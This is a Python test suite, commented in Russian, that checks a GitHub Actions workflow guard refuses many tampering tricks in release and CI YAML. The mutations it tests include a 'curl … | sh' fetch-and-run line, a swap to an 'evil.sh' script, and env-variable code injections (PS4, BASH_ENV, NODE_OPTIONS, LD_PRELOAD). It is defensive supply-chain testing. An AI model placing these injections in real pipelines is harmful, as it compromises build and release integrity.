"""workflow_guard_bypass (design 004 §12): мутации по каждому обходу Н3-1 и обходам аудита И6a - отказ.

Запускается в контейнере контроллера (там PyYAML, закреплённый хэшем): `python3 -I test_workflow_guard_bypass.py`.
Каждая мутация обязана куда-то попасть (rtlib.sub), иначе тест ничего бы не проверял; чистая копия обязана проходить.
Переменные окружения шагов (SHELLOPTS, PS4, BASH_ENV, NODE_OPTIONS, GH_HOST …) - обход аудита: bash/node/gh исполняют
код из окружения раньше любых проверок в скриптах, поэтому env критичных заданий закреплён побайтово.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import rtlib  # noqa: E402

guard = rtlib.load(os.path.join(rtlib.REL, "workflow_guard.py"), "workflow_guard")
W = ".github/workflows/"
ATTEST = "      - uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2\n"
GATE_RUN = "        run: bash deploy/release/gate.sh\n"
GATE_STEP = "      - name: Формат метки, событие и коммит из main\n" + GATE_RUN
PUB_RUN = 'bash src/deploy/release/publish.sh "$SA_ARCHIVE" "$SA_DIGEST" "$SA_REPO" "$GITHUB_REF_NAME"'
RUNNER_NAME = "      - name: Сверка раннеров прогона через API\n"
GH_TOKEN = "          GH_TOKEN: ${{ github.token }}\n"
BUILD_HEAD = "  build-image:\n    timeout-minutes: 30\n"
PUB_ENV = "          SA_REPO: ghcr.io/iliasa101/albums-svc\n"
LOGIN_ENV = "          TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
REQ_ENV = "          SA_REQUIRED_JOBS: checks / build-image;checks / stand-full;release-publish\n"
BUILD_ENV = "          SA_VERSION_REF: ${{ inputs.version }}\n"
CYR_E = chr(0x435)  # кириллическая «е» (U+0435): выглядит как латинская
UPLOAD = "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2"

# (имя, файл, что заменить, на что, подстрока в сообщении)
CASES = [
    ("поток {uses: …} с чужим sha", "release.yml", ATTEST, "      - {uses: actions/attest@ffffffffffffffffffffffffffffffffffffffff}\n", "двоеточие"),
    ('ключ "uses" в кавычках', "release.yml", "      - uses: actions/attest@", '      - "uses": actions/attest@', "кавычки"),
    ("ключ 'runs-on' в кавычках", "release.yml", "  release-gate:\n    timeout-minutes: 10\n    runs-on: ubuntu-24.04", "  release-gate:\n    timeout-minutes: 10\n    'runs-on': ubuntu-24.04", "не вида «ключ"),
    ("якорь &a", "release.yml", "      - name: Формат метки, событие и коммит из main\n", "      - name: &a Формат метки\n", "служебного знака"),
    ("ссылка *a", "release.yml", GATE_RUN, "        run: *a\n", "служебного знака"),
    ("слияние <<: *a", "release.yml", "    permissions:\n      contents: read\n    steps:\n      - uses", "    permissions:\n      contents: read\n      <<: *a\n    steps:\n      - uses", "не вида «ключ"),
    ("тег !!str", "release.yml", GATE_RUN, "        run: !!str bash deploy/release/gate.sh\n", "служебного знака"),
    ("продолжение простого скаляра", "release.yml", "      - name: Формат метки, событие и коммит из main\n", "      - name: Формат метки\n          и ещё строка\n", "глубже"),
    ("${{ vars['X'] }}", "release.yml", GH_TOKEN, "          GH_TOKEN: ${{ vars['X'] }}\n", "вне перечня"),
    ("${{ toJSON(secrets) }}", "release.yml", GH_TOKEN, "          GH_TOKEN: ${{ toJSON(secrets) }}\n", "вне перечня"),
    ("${{ format('{0}', secrets.X) }}", "release.yml", GH_TOKEN, "          GH_TOKEN: ${{ format('{0}', secrets.X) }}\n", "не в канонической форме"),
    ("второй документ ---", "release.yml", "jobs:\n", "jobs:\n---\n", "маркер документа"),
    ("--- в конце файла", "ci.yml", "      version: ci\n", "      version: ci\n---\nfoo: bar\n", "маркер документа"),
    ("табуляция", "release.yml", "  release-gate:\n    timeout-minutes: 10\n", "  release-gate:\n\ttimeout-minutes: 10\n", "U+0009"),
    ("shell: bash {0}", "release.yml", GATE_STEP, GATE_STEP + "        shell: bash {0}\n", "фигурные скобки"),
    ("shell: bash (без скобок)", "release.yml", GATE_STEP, GATE_STEP + "        shell: bash\n", "вне перечня"),
    ("defaults:", "release.yml", "permissions: {}\n", "permissions: {}\n\ndefaults:\n  run:\n    shell: bash\n", "вне перечня"),
    ("continue-on-error на шаге сверки раннеров", "release.yml", RUNNER_NAME, RUNNER_NAME + "        continue-on-error: true\n", "вне перечня"),
    ("continue-on-error на build-image", "checks.yml", BUILD_HEAD, BUILD_HEAD + "    continue-on-error: true\n", "вне перечня"),
    ("if: always() на шаге сверки", "release.yml", RUNNER_NAME, RUNNER_NAME + "        if: always()\n", "эталону guard"),
    ("if: false на шаге сверки", "release.yml", RUNNER_NAME, RUNNER_NAME + "        if: false\n", "эталону guard"),
    ("if: false на задании build-image", "checks.yml", BUILD_HEAD, BUILD_HEAD + "    if: false\n", "вне перечня"),
    ("uses: в тексте run", "release.yml", GATE_RUN, "        run: |\n          bash deploy/release/gate.sh\n          uses: actions/x\n", "служебное слово"),
    ("кириллический двойник в адресе run выпуска", "release.yml", PUB_RUN, PUB_RUN.replace("release/publish", f"r{CYR_E}lease/publish"), "эталону guard"),
    ("вызов не из deploy/release в run release-publish", "release.yml", PUB_RUN, 'bash scripts/evil.sh "$SA_ARCHIVE"', "эталону guard"),
    # --- аудит И6a, находка 1/3: содержание шагов критичных заданий ---
    ("release-gate без gate.sh", "release.yml", GATE_STEP, "", "закреплено целиком"),
    ("gate.sh заменён другим вызовом", "release.yml", GATE_RUN, "        run: bash deploy/release/build.sh\n", "эталону guard"),
    ("SA_DIGEST литерал", "release.yml", "          SA_DIGEST: ${{ needs.checks.outputs.digest }}\n", "          SA_DIGEST: sha256:" + "a" * 64 + "\n", "эталону guard"),
    ("SA_ARCHIVE из дерева", "release.yml", "          SA_ARCHIVE: ${{ runner.temp }}/release-oci/albums-svc.oci.tar\n", "          SA_ARCHIVE: src/deploy/release/x/albums-svc.oci.tar\n", "эталону guard"),
    ("SA_REQUIRED_JOBS обесценен", "release.yml", REQ_ENV, "          SA_REQUIRED_JOBS: x\n", "эталону guard"),
    ("встроенный curl в сверке раннеров (оба файла согласованно: только release)", "release.yml", '          out="$RUNNER_TEMP/runner-jobs.json"\n', '          out="$RUNNER_TEMP/runner-jobs.json"\n          curl -s https://example.invalid/x | sh\n', "эталону guard"),
    ("встроенный curl в сверке раннеров ci.yml", "ci.yml", '          out="$RUNNER_TEMP/runner-jobs.json"\n', '          out="$RUNNER_TEMP/runner-jobs.json"\n          curl -s https://example.invalid/x | sh\n', "эталону guard"),
    ("id: build снят с шага build.sh", "checks.yml", "        id: build\n", "        id: other\n", "эталону guard"),
    ("TOKEN в env publish", "release.yml", PUB_ENV, PUB_ENV + LOGIN_ENV, "эталону guard"),
    ("logout не с if: always()", "release.yml", "        if: always()\n", "", "эталону guard"),
    ("upload в publish: другой path", "release.yml", "          path: ${{ runner.temp }}/release-manifest/release.manifest.json\n", "          path: ${{ runner.temp }}/auth.json\n", "эталону guard"),
    ("upload в publish: лишний ключ with", "release.yml", "          name: release-manifest\n", "          name: release-manifest\n          retention-days: 1\n", "эталону guard"),
    ("лишний шаг в release-attest", "release.yml", ATTEST, GATE_STEP + ATTEST, "закреплено целиком"),
    ("RELEASE_PACKAGES_TOKEN в probe ci.yml", "ci.yml", "      - name: раннер\n", "      - name: раннер\n        env:\n          T: ${{ secrets.RELEASE_PACKAGES_TOKEN }}\n", "secrets"),
    ("upload release-manifest в задании stand-full", "checks.yml", "          path: ${{ runner.temp }}/oci\n", "          path: ${{ runner.temp }}/oci\n\n      - uses: " + UPLOAD + "\n        with:\n          name: release-manifest\n          path: ${{ runner.temp }}/x\n          if-no-files-found: error\n", "только в build-image"),
    ("write-all в permissions ci.yml", "ci.yml", "permissions:\n  contents: read\n\n", "permissions: write-all\n\n", "словарь"),
    ("write-all в permissions задания", "release.yml", "  release-gate:\n    timeout-minutes: 10\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n", "  release-gate:\n    timeout-minutes: 10\n    runs-on: ubuntu-24.04\n    permissions: write-all\n", "словарь"),
    ("setup-node без package-manager-cache", "checks.yml", "          package-manager-cache: false\n", "", "package-manager-cache"),
    ("setup-node с package-manager-cache: true", "checks.yml", "          package-manager-cache: false\n", "          package-manager-cache: true\n", "package-manager-cache"),
    # --- повторный аудит: ${{ в name и ключи уровня задания ---
    ("${{ github.token }} в name шага release-publish", "release.yml", "      - name: Вход в реестр\n", "      - name: ${{ github.token }}\n", "в name"),
    ("${{ secrets.GITHUB_TOKEN }} в name шага release-publish", "release.yml", "      - name: Вход в реестр\n", "      - name: ${{ secrets.GITHUB_TOKEN }}\n", "в name"),
    ("${{ github.token }} в name задания probe", "ci.yml", "  probe:\n", "  probe:\n    name: ${{ github.token }}\n", "в name"),
    ("${{ github.ref }} в name workflow", "ci.yml", "name: CI\n", "name: ${{ github.ref }}\n", "в name"),
    ("environment: release у release-publish", "release.yml", "  release-publish:\n    needs: [release-gate, checks]\n", "  release-publish:\n    needs: [release-gate, checks]\n    environment: release\n", "environment"),
    ("environment у build-image", "checks.yml", BUILD_HEAD, BUILD_HEAD + "    environment: release\n", "environment"),
    ("outputs у release-gate", "release.yml", "  release-gate:\n    timeout-minutes: 10\n", "  release-gate:\n    timeout-minutes: 10\n    outputs:\n      x: y\n", "вне эталона"),
    ("name у задания release-gate (дубль имени обязательного)", "release.yml", "  release-gate:\n    timeout-minutes: 10\n", "  release-gate:\n    timeout-minutes: 10\n    name: release-publish\n", "вне эталона"),
    ("name у задания runner-check", "ci.yml", "  runner-check:\n    needs: [probe, checks]\n", "  runner-check:\n    needs: [probe, checks]\n    name: x\n", "вне эталона"),
    ("timeout release-publish 20 -> 360", "release.yml", "    timeout-minutes: 20\n", "    timeout-minutes: 360\n", "timeout-minutes должен быть"),
    ("env на шаге uses (checkout)", "checks.yml", "      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n", "      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n        env:\n          GITLEAKS_VERSION: x\n", "переменных окружения нет"),
]

# Переменные окружения, исполняющие код или перенаправляющие инструмент. Куда ни положи - отказ.
ENV_BAD = [
    ("SHELLOPTS", "xtrace"), ("PS4", "$(id>&2)"), ("BASH_ENV", "src/deploy/release/evil.sh"), ("BASHOPTS", "x"), ("ENV", "x"),
    ("NODE_OPTIONS", "--import=data:text/javascript,1"), ("GH_HOST", "example.invalid"), ("GH_ENTERPRISE_TOKEN", "x"),
    ("LD_PRELOAD", "src/x.so"), ("PATH", "src/bin"), ("HTTPS_PROXY", "example.invalid"), ("PYTHONPATH", "src"), ("PYTHONSTARTUP", "x"),
    ("GIT_SSH_COMMAND", "x"), ("SA_GATE_MAIN_REF", "HEAD"), ("SA_REGISTRY", "example.invalid"), ("SA_DEST_TLS_VERIFY", "false"),
]
# (файл, после какой строки вставить env, нужен ли заголовок env:, что ожидаем)
ENV_PLACES = [
    ("release.yml", PUB_ENV, False, "эталону guard"),
    ("release.yml", LOGIN_ENV, False, "эталону guard"),
    ("release.yml", REQ_ENV, False, "эталону guard"),
    ("release.yml", GATE_RUN, True, "эталону guard"),
    ("release.yml", "        id: attest\n", True, "эталону guard"),
    ("checks.yml", BUILD_ENV, False, "эталону guard"),
    ("ci.yml", REQ_ENV.replace(";release-publish", ""), False, "эталону guard"),
    ("checks.yml", "      - name: инварианты workflow\n", True, "вне перечня"),
    ("ci.yml", "      - name: раннер\n", True, "вне перечня"),
]


class Bypass(rtlib.Case):
    def tree(self, muts=()):
        self.n = getattr(self, "n", 0) + 1
        root = self.path(f"tree{self.n}")
        rtlib.copy_tree(root)
        for rel, old, new in muts:
            p = os.path.join(root, rel)
            rtlib.write(p, rtlib.sub(rtlib.read(p), old, new))
        return root

    def test_clean_copy_passes(self):
        self.assertEqual(rtlib.check(guard, self.tree()), [])

    def test_each_bypass_is_refused(self):
        for name, fname, old, new, want in CASES:
            with self.subTest(name):
                errs = rtlib.check(guard, self.tree([(W + fname, old, new)]))
                self.assertTrue(errs, f"обход «{name}» не отклонён")
                self.assertTrue(any(want in e for e in errs), f"{name}: нет «{want}» в {errs}")

    def test_dangerous_environment_everywhere(self):
        for fname, anchor, header, want in ENV_PLACES:
            for key, value in ENV_BAD:
                with self.subTest(f"{fname} {key} после {anchor.strip()[:30]}"):
                    add = f"          {key}: {value}\n"
                    if header:
                        add = "        env:\n" + add
                    errs = rtlib.check(guard, self.tree([(W + fname, anchor, anchor + add)]))
                    self.assertTrue(errs, f"env {key} не отклонён")
                    self.assertTrue(any(want in e for e in errs), f"{key}: нет «{want}» в {errs}")

    def test_placeholder_sha_is_refused(self):
        fake = "1e69f48a" + "0" * 32
        real = "1e69f48acb82d1966a394da916b4c1698aa569d6"
        for muts in (
            [(W + "release.yml", real, fake), ("deploy/release/actions.lock", real, fake)],  # согласованно: workflow и lock
            [("deploy/release/actions.lock", real, fake)],
            [(W + "release.yml", real, fake)],
        ):
            errs = rtlib.check(guard, self.tree(muts))
            self.assertTrue(errs)
        errs = rtlib.check(guard, self.tree([(W + "release.yml", real, fake), ("deploy/release/actions.lock", real, fake)]))
        self.assertTrue(any("заготовк" in e for e in errs), errs)

    def test_placeholder_in_lock_only(self):
        # лишняя строка-заготовка в lock, в workflow не используемая: краснеет сам load_lock
        extra = "actions/setup-python v7.1.0 " + "0" * 40 + "\nactions/checkout v7.0.1"
        errs = rtlib.check(guard, self.tree([("deploy/release/actions.lock", "actions/checkout v7.0.1", extra)]))
        self.assertTrue(any("actions.lock" in e and "заготовк" in e for e in errs), errs)

    def test_placeholder_in_uses_only(self):
        # check_uses сам, с lock, где заготовка есть: слой «uses» не полагается на load_lock
        wfrules = rtlib.load(os.path.join(rtlib.REL, "wfrules.py"), "wfrules")
        wfparse = rtlib.load(os.path.join(rtlib.REL, "wfparse.py"), "wfparse")
        sha = "1e69f48a" + "0" * 32
        uses = wfparse.Scalar("actions/attest@" + sha)
        uses.comment = " v4.2.2"
        errs = []
        wfrules.check_uses(uses, "t", {("attest", sha): "v4.2.2"}, errs, False)
        self.assertTrue(any("заготовк" in e for e in errs), errs)

    def test_lock_format(self):
        sha = "3d3c42e5aac5ba805825da76410c181273ba90b1"
        for new in (sha + " # хвостовой комментарий", sha + "0"):
            errs = rtlib.check(guard, self.tree([("deploy/release/actions.lock", sha, new)]))
            self.assertTrue(any("actions.lock" in e for e in errs), errs)

    def test_symlink_workflow_is_refused(self):
        for name in ("release.yml", "checks.yml", "ci.yml"):
            root = self.tree()
            p = os.path.join(root, W + name)
            copy = os.path.join(root, "deploy", "release", "copy.yml")
            os.rename(p, copy)
            os.symlink(copy, p)
            errs = rtlib.check(guard, root)
            self.assertTrue(any("не обычный файл" in e for e in errs), (name, errs))

    def test_missing_or_extra_workflow_files(self):
        root = self.tree()
        os.remove(os.path.join(root, W + "ci.yml"))
        self.assertTrue(any("нет файла в --root" in e for e in guard.check_tree(root, None, rtlib.tree_paths(root) + [W + "ci.yml"])))
        errs = rtlib.check(guard, self.tree(), drop=[W + "ci.yml"])
        self.assertTrue(any("нет в дереве коммита" in e for e in errs), errs)
        errs = rtlib.check(guard, self.tree(), extra=[".github/dependabot.yml"])
        self.assertTrue(any("незнакомый файл" in e for e in errs), errs)

    def test_scalars_instead_of_mappings_give_refusal_not_exception(self):
        for name, key in (("release.yml", "\njobs:"), ("checks.yml", "\njobs:"), ("ci.yml", "\njobs:")):
            root = self.tree()
            p = os.path.join(root, W + name)
            text = rtlib.read(p)
            rtlib.write(p, text[: text.index(key)] + "\njobs: x\n")
            errs = rtlib.check(guard, root)
            self.assertTrue(errs, name)

    def test_tree_path_not_ascii(self):
        errs = rtlib.check(guard, self.tree(), extra=["deploy/release/" + chr(0x444) + ".txt"])
        self.assertTrue(any("не печатный ASCII" in e for e in errs), errs)

    def test_control_chars_in_path_are_escaped_in_message(self):
        # имя файла приходит из коммита: ESC и BEL не должны попасть в сообщение сырыми (терминал владельца)
        errs = rtlib.check(guard, self.tree(), extra=["cmd/x\x1b]0;PWNED\x07.go"])
        text = "\n".join(errs)
        self.assertTrue(any("не печатный ASCII" in e for e in errs), errs)
        self.assertNotIn("\x1b", text)
        self.assertNotIn("\x07", text)

    def test_two_representations_diverge(self):
        # 010: белый список видит строку, PyYAML (YAML 1.1) - восьмеричное число 8
        errs = rtlib.check(guard, self.tree([(W + "release.yml", "  release-gate:\n    timeout-minutes: 10\n", "  release-gate:\n    timeout-minutes: 010\n")]))
        self.assertTrue(any("расхождение" in e for e in errs), errs)

    def test_two_representations_diverge_on_synthetic_file(self):
        errs = []
        self.assertIsNone(guard.two_ways("a: 010\n", "синтетика", errs))
        self.assertTrue(any("расхождение" in e for e in errs), errs)
        errs = []
        self.assertIsNotNone(guard.two_ways("a: 10\nb:\n  - x\n", "синтетика", errs))
        self.assertEqual(errs, [])

    def test_pyyaml_line_differs_from_controller(self):
        root = self.tree()
        p = os.path.join(root, "deploy", "release", "requirements.txt")
        text = rtlib.read(p)
        i = text.index("--hash=sha256:") + len("--hash=sha256:")
        rtlib.write(p, text[:i] + ("0" if text[i] != "0" else "1") + text[i + 1 :])
        errs = rtlib.check(guard, root)
        self.assertTrue(any("PyYAML" in e for e in errs), errs)

    def cli(self, root, paths_bytes, *extra):
        pf = self.path("paths")
        with open(pf, "wb") as f:
            f.write(paths_bytes)
        script = os.path.join(rtlib.REL, "workflow_guard.py")
        return rtlib.sh([sys.executable, "-I", script, "--root", root, "--paths", pf, *extra])

    def test_cli_exit_codes(self):
        root = self.tree()
        paths = "\0".join(rtlib.tree_paths(root)).encode() + b"\0"
        self.assertEqual(self.cli(root, paths)[0], 0)
        self.assertEqual(self.cli(root, paths, "--pins", self.path("нет"))[0], 3)
        self.assertEqual(self.cli(root, paths + "deploy/release/".encode() + chr(0x444).encode() + b"\0")[0], 3)  # не ASCII в paths
        p = os.path.join(root, W + "release.yml")
        rtlib.write(p, rtlib.read(p).replace("v[0-9]+", "v[0-9]*"))
        rc, out = self.cli(root, paths)
        self.assertEqual(rc, 3, out)
        script = os.path.join(rtlib.REL, "workflow_guard.py")
        self.assertEqual(rtlib.sh([sys.executable, "-I", script])[0], 2)
        self.assertEqual(rtlib.sh([sys.executable, "-I", script, root])[0], 2)  # прежний позиционный вызов
        self.assertEqual(rtlib.sh([sys.executable, "-I", script, "--root", root])[0], 2)  # --paths обязателен
        self.assertEqual(rtlib.sh([sys.executable, "-I", script, "--root", root, "--paths", self.path("нет-файла")])[0], 2)

    def test_ansible_requirements_is_mandatory(self):
        # deploy/ansible/requirements.txt обязателен и в paths, и в --root (И6b кладёт его в /src)
        root = self.tree()
        errs = rtlib.check(guard, root, drop=["deploy/ansible/requirements.txt"])
        self.assertTrue(any("обязателен" in e for e in errs), errs)
        os.remove(os.path.join(root, "deploy", "ansible", "requirements.txt"))
        paths = "\0".join(rtlib.tree_paths(root) + ["deploy/ansible/requirements.txt"]).encode() + b"\0"
        rc, out = self.cli(root, paths)
        self.assertEqual(rc, 3, out)
        self.assertIn("deploy/ansible/requirements.txt", out)


if __name__ == "__main__":
    rtlib.main()
